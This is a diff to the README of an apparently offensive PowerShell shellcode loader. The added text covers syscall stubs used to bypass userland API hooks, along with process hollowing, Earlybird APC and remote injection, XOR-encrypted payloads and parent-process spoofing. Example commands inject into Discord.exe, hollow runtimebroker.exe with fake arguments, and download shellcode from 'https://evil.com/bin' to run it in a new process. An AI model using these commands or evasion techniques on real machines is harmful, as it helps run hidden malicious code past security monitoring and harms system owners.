@@ -142,12 +142,14 @@ end
 </details>
 
 <details>
-  <summary><b>❌ Direct System Call Implementation</b></summary>
+  <summary><b>✅ Syscall Implementation</b></summary>
   
   - **Summary:**
-    - Bypass userland API hooks by invoking direct system calls via SysCall stubs.
-    - SysCalls are dependent on system architecture and build versions, so this will need to be very modular.
+    - Bypass userland API hooks by invoking direct & indirect system calls via Syscall stubs.
+    - Syscalls are dependent on system architecture and build versions, so this will need to be very modular.
     - Reference: https://j00ru.vexillium.org/syscalls/nt/64/
+    - Custom Script: [Syscall-Resolver.ps1](./helpers/Syscall-Resolver.ps1)
+    - Will refine and turn into a proper injection technique later.
 </details>
 
 ## Load-Shellcode.ps1 Usage
@@ -159,23 +161,41 @@ _(Note: the current `Load-Shellcode.ps1` is old and worse than the standalone sc
 Usage: Load-Shellcode [options]
 
 Parameters:
-  -Shellcode  -->  Shellcode to execute (can be a byte array or string containing file path or bytes).
-  -TargetPID  -->  Target process PID to inject into. 
-  -Debug      -->  Pause execution and print shellcode address for process attachment.
-  -Help       -->  Return Get-Help information.
+  # Injection Technique
+  -LocalInject    -->  Perform threadless local process injection. (alias: -Threadless)
+  -RemoteInject   -->  Perform remote process injection.           (alias: -Remote)
+  -ProcessHollow  -->  Perform process hollowing.                  (alias: -Hollow)
+  -APCInject      -->  Perform Earlybird APC queue injection.      (alias: -Earlybird)
+ 
+  # Universal Arguments
+  -Shellcode      -->  Shellcode to execute (can be a byte array, string, filepath, or URI).
+  -XorKey         -->  XOR cipher key for the shellcode (max value: 0xFF).
+  -UseProxy       -->  Attempt to authenticate to the system's default proxy (URI shellcode only).
+  -Debug          -->  Pause execution and shellcode memory address for process attachment.
+  -Help           -->  Return Get-Help information.
 
-Example(s):
-  ____________________________________________________________________________
- |                                                                            |
- | # Inject shellcode strintg into the current PowerShell process (and debug) |
- | PS> Load-Shellcode -Shellcode $calc64 -TargetPID $PID -Debug               |
- |                                                                            |
- | # Inject shellcode binary into 'Discord.exe'                               |
- | PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1         |
- | PS> Load-Shellcode -Shellcode .\calc64.bin -TargetPID $DiscordPID          |
- |____________________________________________________________________________|
+  # Technique-specific Arguments
+  -TargetPID      -->  Target process PID to inject into.           (-Remote)
+  -CreateProcess  -->  Process to create and inject with shellcode. (-Hollow/-Earlybird)
+  -ProcessArgs    -->  Pass fake arguments to the created process.  (-Hollow/-Earlybird)
+  -ParentProcess  -->  Name of parent process to attempt to spoof.  (-Hollow/-Earlybird)
+  -ParentPID      -->  PID of parent process to attempt to spoof.   (-Hollow/-Earlybird)
+
+Example Usage:
+ _______________________________________________________________________________________________________________
+|                                                                                                               |
+| # Remote inject shellcode file into 'Discord.exe'                                                             |
+| PS> $DiscordPID = (Get-Process -Name Discord).Id | Select -First 1                                            |
+| PS> Load-Shellcode -LocalInject -Shellcode .\calc64.bin -TargetPID $DiscordPID                                |
+|                                                                                                               |
+| # Process hollow 'runtimebroker.exe' with spoofed process arguments                                           |
+| PS> Load-Shellcode -Hollow -Shellcode ./msgbox64.bin -CreateProcess 'runtimebroker' -ProcessArgs '-Embedding' |
+|                                                                                                               |
+| # Earlybird inject 'calc.exe' with XOR encrypted shellcode downloaded from a URI                              |
+| PS> Load-Shellcode -Earlybird -Shellcode 'https://evil.com/bin' -XorKey 0x69 -CreateProcess 'calc'            |
+|_______________________________________________________________________________________________________________|
 ```
-_(Note: as of writing, only Win32-based remote process injection has been implemented -- will update over time)_
+_(Note: old photo; will update once I fix some issues and bump to v1.0.0)_
 
 ![image](https://github.com/user-attachments/assets/8753c151-8cc4-4f19-90be-23a8c2a620c5)
 
